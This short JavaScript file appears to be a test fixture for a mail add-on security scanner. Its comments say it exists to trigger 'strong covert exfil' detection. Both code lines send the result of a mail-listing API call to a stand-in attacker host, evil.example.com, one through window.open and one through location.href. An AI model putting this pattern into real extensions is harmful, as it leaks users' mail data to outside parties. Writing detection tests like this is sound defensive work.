// This add-on intentionally triggers the two disguised covert-channel checks that
// escalate a STRONG exfil (a user-data API call carried in the URL of a covert
// navigation) to a hard error - see isStrongCovertExfil in src/lib/outbound-sinks.js.
// Both sinks carry a messenger.messages.* call (grounded by messagesRead +
// accountsRead), so carriesData is true and the destination is a remote host.

// disguised-window: window.open to a remote host, carrying a mail-message API call.
window.open("https://evil.example.com/?d=" + messenger.messages.list(folderId));

// disguised-navigation: a location navigation to a remote host, carrying a
// mail-message API call (href on a location object routes to the "navigation" sink).
location.href = "https://evil.example.com/?d=" + messenger.messages.list(folderId);
